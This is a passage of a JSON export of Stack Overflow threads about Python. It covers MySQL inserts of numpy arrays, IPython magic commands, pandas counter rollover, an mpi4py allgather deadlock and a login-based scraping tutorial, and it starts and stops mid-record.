"user_type": "registered", "profile_image": "https://i.stack.imgur.com/40VxD.gif?s=128&g=1", "display_name": "Maximilian Peters", "link": "https://stackoverflow.com/users/2776376/maximilian-peters"}, "edited": false, "score": 0, "creation_date": 1463004097, "post_id": 37173748, "comment_id": 61882666, "body": "what do you get for print(type(data.atomcoords)) ?"}, {"owner": {"reputation": 61, "user_id": 6322610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32fd1b6cbbda5a1bde8b4d250608ba87?s=128&d=identicon&r=PG&f=1", "display_name": "D1&#39;", "link": "https://stackoverflow.com/users/6322610/d1"}, "edited": false, "score": 0, "creation_date": 1463004171, "post_id": 37173748, "comment_id": 61882694, "body": "I get   numpy.ndarray"}, {"owner": {"reputation": 16773, "user_id": 5827215, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s_pAOw1Sc-M/AAAAAAAAAAI/AAAAAAAAAMA/J-R1IMHbuY4/photo.jpg?sz=128", "display_name": "Tadhg McDonald-Jensen", "link": "https://stackoverflow.com/users/5827215/tadhg-mcdonald-jensen"}, "edited": false, "score": 2, "creation_date": 1463067664, "post_id": 37173748, "comment_id": 61915737, "body": "@JarrodRoberson this is not a dup of &quot;int is not iterable&quot; because that is about a mistake that <code>(25)</code> is not a one element tuples and the answer has nothing to do with pushing integer values to an sql database."}, {"owner": {"reputation": 16773, "user_id": 5827215, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-s_pAOw1Sc-M/AAAAAAAAAAI/AAAAAAAAAMA/J-R1IMHbuY4/photo.jpg?sz=128", "display_name": "Tadhg McDonald-Jensen", "link": "https://stackoverflow.com/users/5827215/tadhg-mcdonald-jensen"}, "edited": false, "score": 2, "creation_date": 1463067819, "post_id": 37173748, "comment_id": 61915855, "body": "@JarrodRoberson this is not a dup of &quot;use a.any() or a.all()&quot; because sql uses the boolean-ness of the expected list input, actually using <code>a.any()</code> or <code>a.all()</code> will not at all help the OP of this question and the answer again has nothing to do with SQL not supporting numpy arrays."}], "answers": [{"comments": [{"owner": {"reputation": 61, "user_id": 6322610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32fd1b6cbbda5a1bde8b4d250608ba87?s=128&d=identicon&r=PG&f=1", "display_name": "D1&#39;", "link": "https://stackoverflow.com/users/6322610/d1"}, "edited": false, "score": 0, "creation_date": 1463005837, "post_id": 37174171, "comment_id": 61883336, "body": "I get TypeError: not all arguments cnverted during string formatting. Can it occur if there is float number or negative ones like: -0.1689 or etc ?"}, {"owner": {"reputation": 24305, "user_id": 2776376, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/40VxD.gif?s=128&g=1", "display_name": "Maximilian Peters", "link": "https://stackoverflow.com/users/2776376/maximilian-peters"}, "reply_to_user": {"reputation": 61, "user_id": 6322610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32fd1b6cbbda5a1bde8b4d250608ba87?s=128&d=identicon&r=PG&f=1", "display_name": "D1&#39;", "link": "https://stackoverflow.com/users/6322610/d1"}, "edited": false, "score": 0, "creation_date": 1463005969, "post_id": 37174171, "comment_id": 61883378, "body": "Try something like x = data.atomcoords.tolist() to see if the conversion works"}, {"owner": {"reputation": 61, "user_id": 6322610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32fd1b6cbbda5a1bde8b4d250608ba87?s=128&d=identicon&r=PG&f=1", "display_name": "D1&#39;", "link": "https://stackoverflow.com/users/6322610/d1"}, "edited": false, "score": 0, "creation_date": 1463006012, "post_id": 37174171, "comment_id": 61883398, "body": "conversion works fine, i dont get it conversion works so why push is not working. It should work. Maybe my sql function is bad ? :("}, {"owner": {"reputation": 24305, "user_id": 2776376, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/40VxD.gif?s=128&g=1", "display_name": "Maximilian Peters", "link": "https://stackoverflow.com/users/2776376/maximilian-peters"}, "reply_to_user": {"reputation": 61, "user_id": 6322610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32fd1b6cbbda5a1bde8b4d250608ba87?s=128&d=identicon&r=PG&f=1", "display_name": "D1&#39;", "link": "https://stackoverflow.com/users/6322610/d1"}, "edited": false, "score": 0, "creation_date": 1463006329, "post_id": 37174171, "comment_id": 61883498, "body": "Can you add the output of tolist()?"}, {"owner": {"reputation": 61, "user_id": 6322610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32fd1b6cbbda5a1bde8b4d250608ba87?s=128&d=identicon&r=PG&f=1", "display_name": "D1&#39;", "link": "https://stackoverflow.com/users/6322610/d1"}, "edited": false, "score": 0, "creation_date": 1463006449, "post_id": 37174171, "comment_id": 61883544, "body": "[[[-3.120774, 1.483773, -0.252458], [-3.809956, 1.642663, 1.119125], [-4.997237, 2.604702, 1.082217]]]"}, {"owner": {"reputation": 61, "user_id": 6322610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32fd1b6cbbda5a1bde8b4d250608ba87?s=128&d=identicon&r=PG&f=1", "display_name": "D1&#39;", "link": "https://stackoverflow.com/users/6322610/d1"}, "edited": false, "score": 0, "creation_date": 1463006459, "post_id": 37174171, "comment_id": 61883547, "body": "its just to long so i shortened it"}, {"owner": {"reputation": 24305, "user_id": 2776376, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/40VxD.gif?s=128&g=1", "display_name": "Maximilian Peters", "link": "https://stackoverflow.com/users/2776376/maximilian-peters"}, "reply_to_user": {"reputation": 61, "user_id": 6322610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32fd1b6cbbda5a1bde8b4d250608ba87?s=128&d=identicon&r=PG&f=1", "display_name": "D1&#39;", "link": "https://stackoverflow.com/users/6322610/d1"}, "edited": false, "score": 0, "creation_date": 1463006552, "post_id": 37174171, "comment_id": 61883566, "body": "It seems like another there is another level inside the array. Try push... tolist()[0]"}, {"owner": {"reputation": 61, "user_id": 6322610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32fd1b6cbbda5a1bde8b4d250608ba87?s=128&d=identicon&r=PG&f=1", "display_name": "D1&#39;", "link": "https://stackoverflow.com/users/6322610/d1"}, "edited": false, "score": 0, "creation_date": 1463006690, "post_id": 37174171, "comment_id": 61883607, "body": "oh ty man :) i dont want to be greedy but maybe u know the way of pushing int value ? :)"}, {"owner": {"reputation": 24305, "user_id": 2776376, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/40VxD.gif?s=128&g=1", "display_name": "Maximilian Peters", "link": "https://stackoverflow.com/users/2776376/maximilian-peters"}, "reply_to_user": {"reputation": 61, "user_id": 6322610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32fd1b6cbbda5a1bde8b4d250608ba87?s=128&d=identicon&r=PG&f=1", "display_name": "D1&#39;", "link": "https://stackoverflow.com/users/6322610/d1"}, "edited": false, "score": 1, "creation_date": 1463036498, "post_id": 37174171, "comment_id": 61892664, "body": "I probably know but this site is not a code writing service ;) Good luck!"}, {"owner": {"reputation": 61, "user_id": 6322610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32fd1b6cbbda5a1bde8b4d250608ba87?s=128&d=identicon&r=PG&f=1", "display_name": "D1&#39;", "link": "https://stackoverflow.com/users/6322610/d1"}, "edited": false, "score": 1, "creation_date": 1463055831, "post_id": 37174171, "comment_id": 61906234, "body": "np, i just created def push2 method for only integers and it working just fine :)"}], "tags": [], "owner": {"reputation": 24305, "user_id": 2776376, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/40VxD.gif?s=128&g=1", "display_name": "Maximilian Peters", "link": "https://stackoverflow.com/users/2776376/maximilian-peters"}, "is_accepted": true, "score": -1, "last_activity_date": 1463006765, "last_edit_date": 1463006765, "creation_date": 1463004846, "answer_id": 37174171, "question_id": 37173748, "link": "https://stackoverflow.com/questions/37173748/typeerror-and-value-error/37174171#37174171", "title": "TypeError and value error", "body": "<p>Based on your comment and <a href=\"http://cclib.github.io/contents.html\" rel=\"nofollow\">http://cclib.github.io/contents.html</a>, it seems that <code>atomcoords</code> is a numpy <code>array</code> but <code>executemany</code> expects a <code>list</code> (<a href=\"https://docs.python.org/2/library/sqlite3.html\" rel=\"nofollow\">https://docs.python.org/2/library/sqlite3.html</a>). Try the following code:</p>\n\n<pre><code>  d.push(data.atomcoords.tolist()[0], \"xyz\", \"2\")\n</code></pre>\n\n<p><a href=\"http://docs.scipy.org/doc/numpy-1.10.0/reference/generated/numpy.ndarray.tolist.html\" rel=\"nofollow\">http://docs.scipy.org/doc/numpy-1.10.0/reference/generated/numpy.ndarray.tolist.html</a></p>\n"}], "owner": {"reputation": 61, "user_id": 6322610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32fd1b6cbbda5a1bde8b4d250608ba87?s=128&d=identicon&r=PG&f=1", "display_name": "D1&#39;", "link": "https://stackoverflow.com/users/6322610/d1"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 328, "favorite_count": 0, "closed_date": 1463341797, "accepted_answer_id": 37174171, "answer_count": 1, "score": -1, "last_activity_date": 1463006765, "creation_date": 1463002822, "last_edit_date": 1463003860, "question_id": 37173748, "link": "https://stackoverflow.com/questions/37173748/typeerror-and-value-error", "closed_reason": "Duplicate", "title": "TypeError and value error", "body": "<p>I have python code where I can push my data to a database.   </p>\n\n<pre><code>   def push(self, data,lname,mname):\n    self.param = data\n    self.lname = lname\n    self.mname = mname\n    # Open database connection\n    db = MySQLdb.connect(host = self.dbhost1,port = self.dbport,user = self.dbuser,passwd = self.dbpass , db = self.dbname)\n\n    # prepare a cursor object using cursor() method\n    cur = db.cursor()\n\n    # Create table as per requirement\n    cur.executemany(\"\"\"\n    INSERT INTO \n        \"\"\"+ self.lname +\"\"\"\n\n    VALUES\n        (\"\"\"+ self.mname +\"\"\", %s, %s, %s)\n    ON DUPLICATE KEY UPDATE\n        x = VALUES(x),\n        y = VALUES(y),\n        z = VALUES(z);\n    \"\"\", self.param)\n    db.commit()\n    # disconnect from server\n    db.close()    \n</code></pre>\n\n<p>I get this error when I try to push <code>natom=83</code></p>\n\n<pre><code>  d.push(data.natom,\"natom\",\"2\")\n  Traceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\n  File \"C:\\Python27\\lib\\site-packages\\cclib\\bridge\\PythonSQL.py\", line 46,   in push\n\"\"\", self.param)\n   File \"C:\\Python27\\lib\\site-packages\\MySQLdb\\cursors.py\", line 246, in executemany\n    self.errorhandler(self, TypeError, msg)\n   File \"C:\\Python27\\lib\\site-packages\\MySQLdb\\connections.py\", line 36, in defaulterrorhandler\nraise errorclass, errorvalue\n TypeError: 'int' object is not iterable\n</code></pre>\n\n<p>This error below i get then i try to push atomcoords = </p>\n\n<pre><code>   [[[1 2 3]\n   [1 4 3] \n   [5 6 7]]]\n</code></pre>\n\n<p>I get the array above from the CCLib library of quantum chemistry calculations, I am not creating it. But still why can't I push it? </p>\n\n<pre><code>  d.push(data.atomcoords,\"xyz\",\"2\")\n  Traceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\n  File \"C:\\Python27\\lib\\site-packages\\cclib\\bridge\\PythonSQL.py\", line 46, in push\n\"\"\", self.param)\n  File \"C:\\Python27\\lib\\site-packages\\MySQLdb\\cursors.py\", line 227, in executemany\nif not args: return\n ValueError: The truth value of an array with more than one element is ambiguous. Use a.any() or a.all() \n</code></pre>\n\n<p>So my code works if I try to push an array like this one.</p>\n\n<pre><code>[[0,2,3],[4,6,3],[5,6,9]]\n</code></pre>\n\n<p>Maybe someone knows the way, solution or knows some info and could share it why it is working only in one way? I searched a lot of solutions about those 2 errors but nothing comes to my head.</p>\n"}, {"tags": ["python", "matplotlib"], "comments": [{"owner": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 0, "creation_date": 1463003047, "post_id": 37173726, "comment_id": 61882237, "body": "It&#39;s <code>%pylab inline</code>, just like it says in your link."}, {"owner": {"reputation": 21, "user_id": 6322598, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Bowtie", "link": "https://stackoverflow.com/users/6322598/bowtie"}, "reply_to_user": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 0, "creation_date": 1463003109, "post_id": 37173726, "comment_id": 61882259, "body": "Thanks for the reply. Same error."}, {"owner": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 1, "creation_date": 1463003132, "post_id": 37173726, "comment_id": 61882269, "body": "Are you running the code in IPython/Jupyter?"}, {"owner": {"reputation": 21, "user_id": 6322598, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Bowtie", "link": "https://stackoverflow.com/users/6322598/bowtie"}, "reply_to_user": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 0, "creation_date": 1463003252, "post_id": 37173726, "comment_id": 61882323, "body": "No. IPython is buggy for me and I am currently installing Jupyter (are they the same thing? Used command &quot;conda install jupyter&quot;) to see if that works. I&#39;m running it from the Spyder IDE"}, {"owner": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 0, "creation_date": 1463003375, "post_id": 37173726, "comment_id": 61882367, "body": "The <code>%</code> commands are IPython <a href=\"http://ipython.readthedocs.io/en/stable/interactive/magics.html\" rel=\"nofollow noreferrer\">magic commands</a>, and don&#39;t work if you&#39;re just running a program without it."}, {"owner": {"reputation": 21, "user_id": 6322598, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Bowtie", "link": "https://stackoverflow.com/users/6322598/bowtie"}, "reply_to_user": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 0, "creation_date": 1463003890, "post_id": 37173726, "comment_id": 61882581, "body": "Thank you, that explains a lot. Now let&#39;s see if I can get IPython to work..."}, {"owner": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 0, "creation_date": 1463004093, "post_id": 37173726, "comment_id": 61882662, "body": "No problem. Getting IPython to work shouldn&#39;t be too hard. <code>pip install -U ipython jupyter</code> will install everything you need."}], "answers": [{"tags": [], "owner": {"reputation": 1859, "user_id": 6195051, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c29d0f5e025b59a5e36c70fdd4333530?s=128&d=identicon&r=PG&f=1", "display_name": "Neapolitan", "link": "https://stackoverflow.com/users/6195051/neapolitan"}, "is_accepted": false, "score": 1, "last_activity_date": 1463026925, "creation_date": 1463026925, "answer_id": 37177230, "question_id": 37173726, "link": "https://stackoverflow.com/questions/37173726/pylab-inline-invalid-syntax/37177230#37177230", "title": "$pylab inline invalid syntax", "body": "<p>Providing the specific syntax error makes it easier to understand the problem.  In my case (IPython 4.0.0, python 2.7, anaconda), I get:</p>\n\n<pre><code>In [1]: %pylab inline\nUsageError: Invalid GUI request u'inline', valid ones are: pyglet, osx, qt5, qt, glut, gtk, gtk3, tk, wx\n</code></pre>\n\n<p>I don't know if the \"%pylab inline\" syntax is from an older or a newer version than I have.</p>\n\n<p>Regardless, without a working IPython package, you can still get interactive plot behaviour from matplotlib by doing the following:</p>\n\n<pre><code>&gt;&gt;&gt; import pylab\n&gt;&gt;&gt; pylab.interactive(True)\n&gt;&gt;&gt; pylab.plot([1,2,3],[1,2,1])\n</code></pre>\n\n<p>This should show the plot, allowing you to interact with it, while still returning you to the console for the next command.</p>\n"}], "owner": {"reputation": 21, "user_id": 6322598, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Bowtie", "link": "https://stackoverflow.com/users/6322598/bowtie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3520, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1463026925, "creation_date": 1463002720, "question_id": 37173726, "link": "https://stackoverflow.com/questions/37173726/pylab-inline-invalid-syntax", "title": "$pylab inline invalid syntax", "body": "<p>I'm trying to follow <a href=\"http://sebastianraschka.com/Articles/2014_pca_step_by_step.html#drop_labels\" rel=\"nofollow\">this PCA tutorial</a> and have hit a roadblock when trying to start pylab with </p>\n\n<pre><code>$pylab inline\n</code></pre>\n\n<p>Where I get a Syntax error. I am using Anaconda/Spyder with Python 3.4, and I do have Pylab installed. I apologize if this a silly question, I have not used python in quite a while. </p>\n"}, {"tags": ["python", "pandas"], "answers": [{"tags": [], "owner": {"reputation": 171449, "user_id": 5741205, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/SG6BE.png?s=128&g=1", "display_name": "MaxU", "link": "https://stackoverflow.com/users/5741205/maxu"}, "is_accepted": true, "score": 1, "last_activity_date": 1463007399, "creation_date": 1463007399, "answer_id": 37174607, "question_id": 37173706, "link": "https://stackoverflow.com/questions/37173706/handling-value-rollover-in-data-frame/37174607#37174607", "title": "Handling value rollover in data frame", "body": "<p>I'm not sure that it always work correctly, but let's try:</p>\n\n<pre><code># groups\ng = df.groupby((df['count'].diff() &lt; 0).cumsum())\n\n# mapping cumulative summand\nmp = df.groupby((df['count'].diff() &lt; 0).cumsum(), as_index=False).max().shift(1).fillna(0)['count']\n\n# math\nfor grp, chunk in g:\n    df['count'] += (df['count'].diff() &lt; 0).cumsum().map(mp) \n</code></pre>\n\n<p>Original DF:</p>\n\n<pre><code>In [416]: df\nOut[416]:\n    count\n0       0\n1       1\n2       2\n3       3\n4       4\n5       5\n6       0\n7       1\n8       2\n9       3\n10      4\n11      0\n12      1\n13      2\n14      3\n15      4\n16      5\n17      6\n18      7\n19      8\n</code></pre>\n\n<p>Result:</p>\n\n<pre><code>In [414]: df\nOut[414]:\n    count\n0     0.0\n1     1.0\n2     2.0\n3     3.0\n4     4.0\n5     5.0\n6     5.0\n7     6.0\n8     7.0\n9     8.0\n10    9.0\n11    9.0\n12   10.0\n13   11.0\n14   12.0\n15   13.0\n16   14.0\n17   15.0\n18   16.0\n19   17.0\n</code></pre>\n\n<p>Explanation:</p>\n\n<p>helper for grouping (monotonically increasing groups):</p>\n\n<pre><code>In [418]: (df['count'].diff() &lt; 0).cumsum()\nOut[418]:\n0     0\n1     0\n2     0\n3     0\n4     0\n5     0\n6     1\n7     1\n8     1\n9     1\n10    1\n11    2\n12    2\n13    2\n14    2\n15    2\n16    2\n17    2\n18    2\n19    2\nName: count, dtype: int32\n</code></pre>\n\n<p>Summand for each group:</p>\n\n<pre><code>In [420]: df.groupby((df['count'].diff() &lt; 0).cumsum(), as_index=False).max().shift(1).fillna(0)['count']\nOut[420]:\n0    0.0\n1    5.0\n2    4.0\nName: count, dtype: float64\n</code></pre>\n\n<p>already mapped summands - they will be added <code>N</code> times (where <code>N</code> is number of groups - <code>3</code> for this example):</p>\n\n<pre><code>In [421]: (df['count'].diff() &lt; 0).cumsum().map(mp)\nOut[421]:\n0     0.0\n1     0.0\n2     0.0\n3     0.0\n4     0.0\n5     0.0\n6     5.0\n7     5.0\n8     5.0\n9     5.0\n10    5.0\n11    4.0\n12    4.0\n13    4.0\n14    4.0\n15    4.0\n16    4.0\n17    4.0\n18    4.0\n19    4.0\nName: count, dtype: float64\n</code></pre>\n\n<p>setup test DF:</p>\n\n<pre><code>df = pd.DataFrame({'count': np.arange(20)})\ndf.ix[6:10, 'count'] = range(5)\ndf.ix[11:19, 'count'] = range(9)\n</code></pre>\n"}], "owner": {"reputation": 39, "user_id": 5290412, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hjJcP.jpg?s=128&g=1", "display_name": "Mikes1962", "link": "https://stackoverflow.com/users/5290412/mikes1962"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 115, "favorite_count": 0, "accepted_answer_id": 37174607, "answer_count": 1, "score": -1, "last_activity_date": 1463007399, "creation_date": 1463002628, "last_edit_date": 1463002680, "question_id": 37173706, "link": "https://stackoverflow.com/questions/37173706/handling-value-rollover-in-data-frame", "title": "Handling value rollover in data frame", "body": "<p>I'm processing a dataframe that contains a column that consists of an error count. The problem I'm having is the counter rolls over after 64k. Additionally, on long runs the rollover occurs multiple times. I need a method to correct these overflows and get an accurate count.</p>\n"}, {"tags": ["python", "parallel-processing", "mpi", "mpi4py"], "answers": [{"comments": [{"owner": {"reputation": 1340, "user_id": 2362377, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/62b8eb91e4d98ef37d2f1eaa56799c74?s=128&d=identicon&r=PG&f=1", "display_name": "SpiderRico", "link": "https://stackoverflow.com/users/2362377/spiderrico"}, "edited": false, "score": 0, "creation_date": 1463005408, "post_id": 37174066, "comment_id": 61883182, "body": "Ah, I see it now! I also tried z = comm.gather(z, root=rank) but it fails also. Any ideas on that?"}, {"owner": {"reputation": 502, "user_id": 3298826, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d80d437d6d9e6b9bc7835a7307792c19?s=128&d=identicon&r=PG", "display_name": "H2O", "link": "https://stackoverflow.com/users/3298826/h2o"}, "reply_to_user": {"reputation": 1340, "user_id": 2362377, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/62b8eb91e4d98ef37d2f1eaa56799c74?s=128&d=identicon&r=PG&f=1", "display_name": "SpiderRico", "link": "https://stackoverflow.com/users/2362377/spiderrico"}, "edited": false, "score": 0, "creation_date": 1463005982, "post_id": 37174066, "comment_id": 61883383, "body": "What <code>gather</code> does is just collect data from all processes in one, meaning you still have to send in each one, but there is just one recipient. I know, the naming is a little confusing. Sadly mpi4py doesn&#39;t exactly have good documentation, take a look at: <a href=\"http://mpi4py.readthedocs.io/en/stable/overview.html\" rel=\"nofollow noreferrer\">mpi4py.readthedocs.io/en/stable/overview.html</a> If it whatever you are looking for is not documented there, take a look at the C-API for MPI."}], "tags": [], "owner": {"reputation": 502, "user_id": 3298826, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d80d437d6d9e6b9bc7835a7307792c19?s=128&d=identicon&r=PG", "display_name": "H2O", "link": "https://stackoverflow.com/users/3298826/h2o"}, "is_accepted": true, "score": 1, "last_activity_date": 1463009028, "last_edit_date": 1592644375, "creation_date": 1463004404, "answer_id": 37174066, "question_id": 37173687, "link": "https://stackoverflow.com/questions/37173687/why-allgather-fails-in-for-loops-with-different-iteration-values/37174066#37174066", "title": "Why AllGather() fails in for loops with different iteration values?", "body": "<p>The second process gets stuck because it is trying to gather from all processes, the second process is waiting for the first to join it in the <code>allgather()</code> operation and will wait indefinitely for this to happen.</p>\n<p>It's kind of hard to tell you a good way to fix this without knowing a practical application.\nBut generally all processes will have to partake in a gather operation, the simple fix is to just let process 0 partake without using the result:</p>\n<pre><code>from mpi4py import MPI\n\ncomm = MPI.COMM_WORLD\nrank = comm.Get_rank()\n\na = None\nif rank == 0:\n    a = 2\nif rank == 1:\n    a = 3\nz = 2\nold_z = None\nfor i in range(0, a):\n    if i == a-1:\n        old_z = z \n    z = comm.allgather(z)\n\nif rank == 0:\n    comm.allgather(old_z)\n\nprint(z, rank)\ncomm.barrier()\n</code></pre>\n<p>This is not a very elegant solution but it does provide your desired output. Note how I had to store the value of z from the processes previous iteration to get anything close to your desired behavior.</p>\n<p>If we don't store the previous value of z we get the following result:</p>\n<blockquote>\n<p>[[2, 2], [2, 2]] 0</p>\n<p>[[[2, 2], [2, 2]], [[2, 2], [2, 2]]] 1</p>\n</blockquote>\n"}], "owner": {"reputation": 1340, "user_id": 2362377, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/62b8eb91e4d98ef37d2f1eaa56799c74?s=128&d=identicon&r=PG&f=1", "display_name": "SpiderRico", "link": "https://stackoverflow.com/users/2362377/spiderrico"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 290, "favorite_count": 0, "accepted_answer_id": 37174066, "answer_count": 1, "score": 0, "last_activity_date": 1463009028, "creation_date": 1463002534, "last_edit_date": 1463002850, "question_id": 37173687, "link": "https://stackoverflow.com/questions/37173687/why-allgather-fails-in-for-loops-with-different-iteration-values", "title": "Why AllGather() fails in for loops with different iteration values?", "body": "<p>I've coded following code to experiment with AllGather():</p>\n\n<pre><code>from mpi4py import MPI\n\ncomm = MPI.COMM_WORLD\nrank = comm.Get_rank()\n\na = None\nif rank == 0:\n    a = 2\nif rank == 1:\n    a = 3\nz = 2\nfor i in range(0, a):\n    z = comm.allgather(z)\n\nprint(z, rank)\ncomm.barrier()\n</code></pre>\n\n<p>I run it as follows:</p>\n\n<blockquote>\n  <p>mpiexec  -n 2 python3  allgather.py</p>\n</blockquote>\n\n<p>I get the following output:</p>\n\n<blockquote>\n  <p>[[2, 2], [2, 2]] 0</p>\n</blockquote>\n\n<p>The 2nd processor is stuck and program doesn't terminate.</p>\n\n<p>The output should be:</p>\n\n<blockquote>\n  <p>[[2, 2], [2, 2]] 0</p>\n  \n  <p>[[2, 2], [2, 2], [2, 2]] 1</p>\n</blockquote>\n\n<p>I fail to see why 2nd processor gets stuck. It runs correctly if I set  a = 2 \nin both processors. What am I doing wrong?</p>\n"}, {"tags": ["python", "html", "python-requests", "lxml", "scraperwiki"], "answers": [{"tags": [], "owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "is_accepted": false, "score": 1, "last_activity_date": 1463003552, "last_edit_date": 1463003552, "creation_date": 1463003177, "answer_id": 37173830, "question_id": 37173666, "link": "https://stackoverflow.com/questions/37173666/i-am-trying-to-scrape-html-from-a-site-that-requires-a-login-but-am-not-getting/37173830#37173830", "title": "I am trying to scrape HTML from a site that requires a login but am not getting any data", "body": "<p>The xpath is wrong, there is no span with the class repo-name, you can get the repo names from the anchor tags with:</p>\n\n<pre><code>bucket_elems = tree.xpath(\"//a[@class='execute repo-list--repo-name']\")\nbucket_names = [bucket_elem.text_content().strip() for bucket_elem in bucket_elems]\n</code></pre>\n\n<p>The html has obviously changed since the tutorial was written.</p>\n"}], "owner": {"reputation": 199, "user_id": 3311786, "user_type": "registered", "accept_rate": 12, "profile_image": "https://www.gravatar.com/avatar/79a594e566e586e35c59787498484eba?s=128&d=identicon&r=PG&f=1", "display_name": "mickolasjae", "link": "https://stackoverflow.com/users/3311786/mickolasjae"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 395, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1463007626, "creation_date": 1463002448, "last_edit_date": 1463007626, "question_id": 37173666, "link": "https://stackoverflow.com/questions/37173666/i-am-trying-to-scrape-html-from-a-site-that-requires-a-login-but-am-not-getting", "title": "I am trying to scrape HTML from a site that requires a login but am not getting any data", "body": "<p><a href=\"https://kazuar.github.io/scraping-tutorial/\" rel=\"nofollow\">I am following this tutorial</a> but I can't seem to get any data when I am running the python. I get an HTTP status code of 200 and <code>status.ok</code> returns a true value. Any help would be great. This is what my response looks like in Terminal:</p>\n\n<pre><code>[]\n\n200\n\nTrue\n\nimport requests\nfrom lxml import html\n\nUSERNAME = \"username@email.com\"\nPASSWORD = \"legitpassword\"\n\nLOGIN_URL = \"https://bitbucket.org/account/signin/?next=/\"\nURL = \"https://bitbucket.org/dashboard/overview\"\n\ndef main():\nsession_requests = requests.session()\n\n# Get login csrf token\nresult = session_requests.get(LOGIN_URL)\ntree = html.fromstring(result.text)\nauthenticity_token = list(set(tree.xpath(\"//input[@name='csrfmiddlewaretoken']/@value\")))[0]\n\n# Create payload\npayload = {\n    \"username\": USERNAME, \n    \"password\": PASSWORD, \n    \"csrfmiddlewaretoken\": authenticity_token\n}\n\n# Perform login\nresult = session_requests.post(LOGIN_URL, data = payload, headers = 